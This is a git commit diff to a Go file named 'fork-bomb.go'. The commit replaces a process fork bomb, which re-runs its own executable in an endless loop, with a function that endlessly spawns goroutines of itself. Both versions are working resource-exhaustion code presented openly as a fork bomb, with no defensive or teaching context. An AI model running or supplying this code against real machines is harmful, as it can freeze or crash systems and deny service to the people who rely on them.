0a08a618ffade96b7877b238f944ef590eef1a03
Calana2 <kalcast00@proton.me>
2025-06-01 14:54:39 -0400

    Update fork-bomb.go

--- miscellaneous/fork-bomb.go
+++ miscellaneous/fork-bomb.go
@@ -1,19 +1,12 @@
 // go build fork-bomb.go
-// ./fork-bomb&
-
 package main
 
-import (
-	"fmt"
-	"os"
-	"os/exec"
-)
+func GoBomb() {
+	for {
+		go GoBomb()
+	}
+}
 
 func main() {
-	for {
-    err := exec.Command(os.Args[0]).Run()
-    if err != nil {
-     fmt.Println(err)
-    }
-	}
+ GoBomb()
 }
